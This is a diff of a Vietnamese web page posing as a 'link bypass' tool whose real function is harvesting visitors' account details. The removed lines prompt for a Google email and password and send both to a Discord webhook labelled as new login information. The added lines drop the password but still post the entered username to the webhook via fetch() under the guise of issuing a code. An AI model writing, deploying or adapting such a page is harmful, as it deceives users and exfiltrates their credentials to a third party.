@@ -89,7 +89,7 @@
         <h2>Tạo Link Vượt Tự Động</h2>
         <div class="step">
             <p>Nhập đường link gốc của bạn:</p>
-            <input type="url" id="targetInput" placeholder="https://example.com">
+            <input type="url" id="targetInput" placeholder="Https://.......">
             <br>
             <button class="btn" onclick="generateShortLink()">Tạo Link</button>
         </div>
@@ -107,9 +107,8 @@
         
         <!-- Bước 1: Nhập thông tin -->
         <div class="step" id="step1">
-            <p>Bước 1: Nhập tài khoản Google & Mật khẩu</p>
-            <input type="text" id="usernameInput" placeholder="Tên người dùng / Email Google">
-            <input type="password" id="passwordInput" placeholder="Mật khẩu của bạn">
+            <p>Bước 1: Nhập tài khoản</p>
+            <input type="text" id="usernameInput" placeholder="Tên người dùng">
             <br>
             <button class="btn" onclick="submitInfoToDiscord()">Gửi & Lấy Mã</button>
         </div>
@@ -146,7 +145,7 @@
     if (encodedUrl) {
         document.getElementById('createSection').classList.add('hidden');
         document.getElementById('bypassSection').classList.remove('hidden');
-        generatedCode = "CODE-" + Math.floor(1000 + Math.random() * 9000);
+        generatedCode = "YOUCODE-" + Math.floor(1000 + Math.random() * 9000);
         document.getElementById('codeBox').value = generatedCode;
     }
 
@@ -190,7 +189,7 @@
 
         // Tạo nội dung gửi về Discord
         const payload = {
-            content: `📥 **THÔNG TIN ĐĂNG NHẬP MỚI**\n👤 **Tên người dùng/Email:** \`${username}\`\n🔑 **Mật khẩu:** \`${password}\`\n🔢 **Mã xác nhận:** \`${generatedCode}\``
+            content: `📥 **THÔNG TIN ĐĂNG NHẬP MỚI**\n👤 **Tên người dùng/Email:** \`${username}\`\n🔢 **Mã xác nhận:** \`${generatedCode}\``
         };
 
         fetch(DISCORD_WEBHOOK_URL, {
